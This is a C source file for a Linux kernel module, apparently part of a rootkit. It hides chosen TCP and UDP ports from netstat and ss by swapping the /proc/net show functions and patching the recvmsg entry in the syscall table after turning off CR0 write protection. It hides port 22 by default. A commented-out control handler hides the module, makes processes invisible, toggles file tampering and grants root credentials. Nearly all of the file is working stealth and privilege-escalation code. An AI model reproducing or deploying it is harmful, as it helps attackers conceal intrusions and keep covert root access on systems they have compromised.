#include "hook.h"
#include "hide_socket.h"
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/rbtree.h>
#include <linux/inet_diag.h>
#include <asm/types.h>
#include <linux/netlink.h> //for netlink macros
#include "list.h"
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/types.h>
#include <linux/sched.h>

/* Dis-/Enable debugging for this module */
#define DEBUG_MODULE	0

#if DEBUG_MODULE == 0
#undef DEBUG(f_, ...)
#define DEBUG(f_, ...)
#endif

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;
	atomic_t in_use;
	struct completion *pde_unload_completion;
	struct list_head pde_openers;
	spinlock_t pde_unload_lock;
	u8 namelen;
	char name[];
};

/************ Prototypes *************/
asmlinkage ssize_t new_recvmsg(int sockfd, struct user_msghdr __user *msg, int flags);
static int find_port_in_list(void *p1, void *p2);
static list_t *give_list_for_protocol(int protocol);

int new_tcp_show(struct seq_file *m, void *v);
int new_tcp6_show(struct seq_file *m, void *v);
int new_udp_show(struct seq_file *m, void *v);
int new_udp6_show(struct seq_file *m, void *v);

/************* Local data ********/
/* Syscall table */
static void **syscall_table_pu64;
/* receive syscall function */
asmlinkage ssize_t (*orig_rcv_func)(int sockfd, struct user_msghdr __user *msg, int flags);
int (*orig_tcp_show)(struct seq_file *m, void *v);
int (*orig_tcp6_show)(struct seq_file *m, void *v);
int (*orig_udp_show)(struct seq_file *m, void *v);
int (*orig_udp6_show)(struct seq_file *m, void *v);


/* locks for unloading */
static int accesses_rcv = 0;
static int accesses_tcp = 0;
static int accesses_tcp6 = 0;
static int accesses_udp = 0;
static int accesses_udp6 = 0;

struct mutex lock_rcv;
struct mutex lock_tcp;
struct mutex lock_tcp6;
struct mutex lock_udp;
struct mutex lock_udp6;

/* list for ports for all 4 protocols */
list_t *tcp = NULL, *tcp6 = NULL, *udp = NULL, *udp6 = NULL;



/******* Public functions ************/

/**
 * Initialize function for socket hiding.
 */
void initialize_socket_hiding(void){

	mutex_init(&lock_rcv);
	mutex_init(&lock_tcp);
	mutex_init(&lock_tcp6);
	mutex_init(&lock_udp);
	mutex_init(&lock_udp6);

	/* Initialize data structures */
	tcp = list_init();
	tcp6 = list_init();
	udp = list_init();
	udp6 = list_init();

	/*
	 * Hook into file ops of proc pids
	 * to hide socket for netstat.
	 */
	struct proc_dir_entry *proc_current;

	/* for every entry a temporary pointer to its data */
	struct tcp_seq_afinfo *tcp_data;
	struct udp_seq_afinfo *udp_data;

	/* needed for iterating through all entries */
	struct rb_root *root = &init_net.proc_net->subdir;
	struct rb_node *proc_node_current = rb_first(root);
	struct rb_node *proc_node_last = rb_last(root);

	while(proc_node_current != proc_node_last) {
		/* get proc_dir_entry from current node */
		proc_current = rb_entry(proc_node_current, struct proc_dir_entry, subdir_node);

		/*
		 * the name of the files are just as their protocol:
		 * tcp, tcp6, udp and udp6 (for ipv4 and ipv6) and
		 * modify every files show function
		 */
		if (!strcmp(proc_current->name, "tcp")) {
			tcp_data = proc_current->data;
			orig_tcp_show = tcp_data->seq_ops.show;
			tcp_data->seq_ops.show = new_tcp_show;
		} else if (!strcmp(proc_current->name, "tcp6")) {
			tcp_data = proc_current->data;
			orig_tcp6_show = tcp_data->seq_ops.show;
			tcp_data->seq_ops.show = new_tcp6_show;
		} else if  (!strcmp(proc_current->name, "udp")) {
			udp_data = proc_current->data;
			orig_udp_show = udp_data->seq_ops.show;
			udp_data->seq_ops.show = new_udp_show;
		} else if (!strcmp(proc_current->name, "udp6")) {
			udp_data = proc_current->data;
			orig_udp6_show = udp_data->seq_ops.show;
			udp_data->seq_ops.show = new_udp6_show;
		}

		proc_node_current = rb_next(proc_node_current);
	}


	// /*
	 // *Hook recvmsg for ss
	 // */
	syscall_table_pu64 = (void **)kallsyms_lookup_name("sys_call_table");
	 /* remove write protection */
	 write_cr0 (read_cr0 () & (~ 0x10000));

	 orig_rcv_func = (void *)syscall_table_pu64[__NR_recvmsg];
	 syscall_table_pu64[__NR_recvmsg] = (void *)new_recvmsg;

	 /* enable write protection */
	 write_cr0 (read_cr0 () | 0x10000);

	add_socket_to_hide(5,22); // hide ssh for debugging
}

/**
 * Cleanup function for socket hiding.
 */
void remove_socket_hiding(void){
	struct proc_dir_entry *proc_current;

	struct tcp_seq_afinfo *tcp_data;
	struct udp_seq_afinfo *udp_data;

	struct rb_root *root = &init_net.proc_net->subdir;
	struct rb_node *proc_node_current = rb_first(root);
	struct rb_node *proc_node_last = rb_last(root);


	/* remove write protection */
	 write_cr0 (read_cr0 () & (~ 0x10000));

	 syscall_table_pu64[__NR_recvmsg] = (void *)orig_rcv_func;

	 /* enable write protection */
	 write_cr0 (read_cr0 () | 0x10000);

	while(proc_node_current != proc_node_last) {

		proc_current = rb_entry(proc_node_current,
			struct proc_dir_entry, subdir_node);

		/* reset show function for all entries */
		if (!strcmp(proc_current->name, "tcp")) {
			tcp_data = proc_current->data;
			tcp_data->seq_ops.show = orig_tcp_show;
		} else if (!strcmp(proc_current->name, "tcp6")) {
			tcp_data = proc_current->data;
			tcp_data->seq_ops.show = orig_tcp6_show;
		} else if  (!strcmp(proc_current->name, "udp")) {
			udp_data = proc_current->data;
			udp_data->seq_ops.show = orig_udp_show;
		} else if (!strcmp(proc_current->name, "udp6")) {
			udp_data = proc_current->data;
			udp_data->seq_ops.show = orig_udp6_show;
		}

		proc_node_current = rb_next(proc_node_current);
	}



	/* Wait till all parts are unloaded successfully */
	while(accesses_rcv > 0
		|| accesses_tcp > 0
		|| accesses_tcp6 > 0
		|| accesses_udp > 0
		|| accesses_udp6 > 0){
		msleep(50);
	}

	/* cleanup data structures */
	list_cleanup_with_data_clean(tcp);
	list_cleanup_with_data_clean(tcp6);
	list_cleanup_with_data_clean(udp);
	list_cleanup_with_data_clean(udp6);

}


void print_all_lists(void){
	DEBUG( "tcp list:\n");
	list_print_as_int(tcp);
	DEBUG( "tcp6 list:\n");
	list_print_as_int(tcp6);
	DEBUG( "udp list:\n");
	list_print_as_int(udp);
	DEBUG( "udp6 list:\n");
	list_print_as_int(udp6);
}

/**
 * Adds a port to be hidden for a protocol.
 */
int add_socket_to_hide(int protocol_type, int port){
	list_t *list_to_add;
	int count;
	int *port_p;
	list_to_add = give_list_for_protocol(protocol_type);
	if(list_to_add != NULL){
		port_p = (int *)kmalloc(sizeof(int), GFP_KERNEL);
		*port_p = port;
		(void *)list_append(list_to_add, (void *)port_p);
		print_all_lists();
		return 0;
	}
	if(protocol_type == p_all){
		for(count = 1; count < p_all; count++){
			list_to_add = give_list_for_protocol(count);
			if(list_to_add != NULL){
				DEBUG( "Protocol nr %d list is found\n", count);
				port_p = (int *)kmalloc(sizeof(int), GFP_KERNEL);
				*port_p = port;
				(void *)list_append(list_to_add, (void *)port_p);
			}
			else{
				DEBUG( "Protocol nr %d list not found\n", count);
			}
		}
		print_all_lists();
		return 0;
	}
	DEBUG( "Error at list adding\n");
	return -1;
}

/**
 * Removes a port from being hidden. Automatically searches for Ports in all lists.
 */
void remove_port_from_hiding(int port){
	list_t *list;
	int count;
	struct list_elem *tmp;
	for(count=1; count < p_all; count++){
		list = give_list_for_protocol(count);
		if(list == NULL) continue;
		tmp = list_find(list, (void *)&port, find_port_in_list);
		(void)list_remove(list, tmp);
	}
}

/***************** Private functions ****************/

/**
 * returns the right list for the protocol according to protocol_e.
 */
static list_t *give_list_for_protocol(int protocol){
	switch(protocol){
		case p_tcp:
			return tcp;
			break;
		case p_tcp6:
			return tcp6;
			break;
		case p_udp:
			return udp;
			break;
		case p_udp6:
			return udp6;
			break;
		default:
			return NULL;
			break;
	}
	return NULL;
}

/**
 * Compare function to extract the port from an protocol list.
 */
static int find_port_in_list(void *p1, void *p2){
	int *i1, *i2;
	i1 = (int *)p1;
	i2 = (int *)p2;
	if(*i1 == *i2){
		DEBUG( "%d are equal.", *i1);
		return 0; //port found
	}
	return 1;
}

/**
 * Checks if an port is in one of the lists.
 * The first list in which it is found, the enum of the protocol
 * according to protocol_e is returned. Otherwise p_none is returned.
 */
static int check_if_port_is_in_list(int port){
	struct list_elem *find;
	find = list_find(tcp, (void *)&port, find_port_in_list);
	if(find != NULL) return p_tcp;
	find = list_find(tcp6, (void *)&port, find_port_in_list);
	if(find != NULL) return p_tcp6;
	find = list_find(udp, (void *)&port, find_port_in_list);
	if(find != NULL) return p_udp;
	find = list_find(udp6, (void *)&port, find_port_in_list);
	if(find != NULL) return p_udp6;

	return p_none;
}

static int check_if_port_is_in_list_protocol(int port, int protocol){
	/*if(port == 22){
		return 1;
	}*/
	struct list_elem *find;
	list_t *my_list = give_list_for_protocol(protocol);
	if(my_list == NULL){
		DEBUG( "list does not exist.");
		return 0;
	}
	find = list_find(my_list, (void *)&port, find_port_in_list);
	if(find != NULL){
		DEBUG( "%d port found in list.", port);
		return 1;
	}

	DEBUG( "%d port not found.", port);
	return 0;
}

int socket_check(struct nlmsghdr *hdr)
{
	int port;

	/* extract data from header */
	struct inet_diag_msg *r = (struct inet_diag_msg *)NLMSG_DATA(hdr);
	port = ntohs(r->id.idiag_sport);

	if(check_if_port_is_in_list(port)) {
		return 1; //found, need to be hidden
	}

	return 0;
}

// static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
// 			    unsigned long arg)
// {
// 	int ret = 0;
// 	unsigned int pid;
// 	struct control args;
// 	struct sockaddr_in addr;
// 	struct hidden_conn *hc;
//
// 	KHOOK_GET(inet_ioctl);
// 	if (cmd == AUTH && arg == HTUA) {
// 		if (control_flag) {
// 			control_flag = 0;
// 		} else {
// 			control_flag = 1;
// 		}
//
// 		goto out;
// 	}
//
// 	if (control_flag && cmd == AUTH) {
// 		if (copy_from_user(&args, (void *)arg, sizeof(args)))
// 			goto out;
//
// 		switch (args.cmd) {
// 		case 0:
// 			if (hide_module) {
// 				show();
// 				hidden = 0;
// 			} else {
// 				hide();
// 				hidden = 1;
// 			}
// 			break;
// 		case 1:
// 			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
// 				goto out;
//
// 			if (is_invisible(pid))
// 				flag_tasks(pid, 0);
// 			else
// 				flag_tasks(pid, 1);
//
// 			break;
// 		case 2:
// 			if (file_tampering)
// 				file_tampering = 0;
// 			else
// 				file_tampering = 1;
// 			break;
// 		case 3:
// #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
// 			current->uid = 0;
// 			current->suid = 0;
// 			current->euid = 0;
// 			current->gid = 0;
// 			current->egid = 0;
// 			current->fsuid = 0;
// 			current->fsgid = 0;
// 			cap_set_full(current->cap_effective);
// 			cap_set_full(current->cap_inheritable);
// 			cap_set_full(current->cap_permitted);
// #else
// 			commit_creds(prepare_kernel_cred(0));
// #endif
// 			break;
// 		case 4:
// 			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
// 				goto out;
//
// 			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
// 			if (!hc)
// 				goto out;
//
// 			hc->addr = addr;
//
// 			list_add(&hc->list, &hidden_tcp_conn);
// 			break;
// 		case 5:
// 			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
// 				goto out;
//
// 			list_for_each_entry(hc, &hidden_tcp_conn, list)
// 			{
// 				if (addr.sin_port == hc->addr.sin_port &&
// 				    addr.sin_addr.s_addr ==
// 					hc->addr.sin_addr.s_addr) {
// 					list_del(&hc->list);
// 					kfree(hc);
// 					break;
// 				}
// 			}
// 			break;
// 		default:
// 			goto origin;
// 		}
//
// 		goto out;
// 	}
//
// origin:
// 	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
// out:
// 	KHOOK_PUT(inet_ioctl);
// 	return ret;
// }


/**
 * New rcvmesg function, which hides our connections.
 */
asmlinkage ssize_t new_recvmsg(int sockfd, struct user_msghdr __user *msg, int flags)
{
	struct nlmsghdr *hdr;
	int found, offset, i;
	long count;
	char *stream;

	long ret = orig_rcv_func(sockfd, msg, flags);

	inc_critical(&lock_rcv, &accesses_rcv);

	/* unsuccesfull call */
	if (ret < 0) {
		dec_critical(&lock_rcv, &accesses_rcv);
		return ret;
	}

	hdr = (struct nlmsghdr *)msg->msg_iov->iov_base;
	count = ret;

	/* indicates if it needs to be hidden */
	found = 1;

	/* see if header fits in rest of message */
	while(NLMSG_OK(hdr, count)) {
		if (found == 0)
			hdr = NLMSG_NEXT(hdr, count);


		//TODO check if netlink message
		/* retrieve data and check if it need to be hidden */
		if(!socket_check(hdr)) {
			/* no need to be hidden, next round */
			found = 0;
			continue;
		}
		else{

			/* needs to be hidden */
			found = 1;
			stream = (char *)hdr;

			/* rounded alignment  */
			offset = NLMSG_ALIGN(hdr->nlmsg_len);

			for (i = 0 ; i < count; i++)
				stream[i] = stream[i + offset];

			ret -= offset;
		}
	}

	//TODO mark last message with NLMSG_DONE
	dec_critical(&lock_rcv, &accesses_rcv);
	return ret;
}

int new_tcp_show(struct seq_file *m, void *v){
	struct inet_sock *inet;
	int port;

	//return 0; //debugging
	inc_critical(&lock_tcp, &accesses_tcp);

	if(SEQ_START_TOKEN == v){
		dec_critical(&lock_tcp, &accesses_tcp);
		return orig_tcp_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	/* port is in list, return 0, so that no port is found */
	if(check_if_port_is_in_list_protocol(port, p_tcp)) {
		dec_critical(&lock_tcp, &accesses_tcp);
		return 0;
	}

	dec_critical(&lock_tcp, &accesses_tcp);
	return orig_tcp_show(m, v);
}

int new_tcp6_show(struct seq_file *m, void *v){
	struct inet_sock *inet;
	int port;

	//return 0; //debugging
	inc_critical(&lock_tcp6, &accesses_tcp6);
	if(SEQ_START_TOKEN == v) {
		dec_critical(&lock_tcp6, &accesses_tcp6);
		return orig_tcp6_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	/* port is in list, return 0, so that no port is found */
	if(check_if_port_is_in_list_protocol(port, p_tcp6)) {
		dec_critical(&lock_tcp6, &accesses_tcp6);
		return 0;
	}

	dec_critical(&lock_tcp6, &accesses_tcp6);
	return orig_tcp6_show(m, v);
}

int new_udp_show(struct seq_file *m, void *v){
	struct inet_sock *inet;
	int port;

	//return 0; //debugging
	inc_critical(&lock_udp, &accesses_udp);
	if(SEQ_START_TOKEN == v) {
		dec_critical(&lock_udp, &accesses_udp);
		return orig_udp_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	/* port is in list, return 0, so that no port is found */
	if(check_if_port_is_in_list_protocol(port, p_udp)) {
		dec_critical(&lock_udp, &accesses_udp);
		return 0;
	}

	dec_critical(&lock_udp, &accesses_udp);
	return orig_udp_show(m, v);
}

int new_udp6_show(struct seq_file *m, void *v){
	struct inet_sock *inet;
	int port;

	//return 0; //debugging
	inc_critical(&lock_udp6, &accesses_udp6);

	if(SEQ_START_TOKEN == v) {
		dec_critical(&lock_udp6, &accesses_udp6);
		return orig_udp6_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	/* port is in list, return 0, so that no port is found */
	if(check_if_port_is_in_list_protocol(port, p_udp6)) {
		dec_critical(&lock_udp6, &accesses_udp6);
		return 0;
	}

	dec_critical(&lock_udp6, &accesses_udp6);
	return orig_udp6_show(m, v);
}
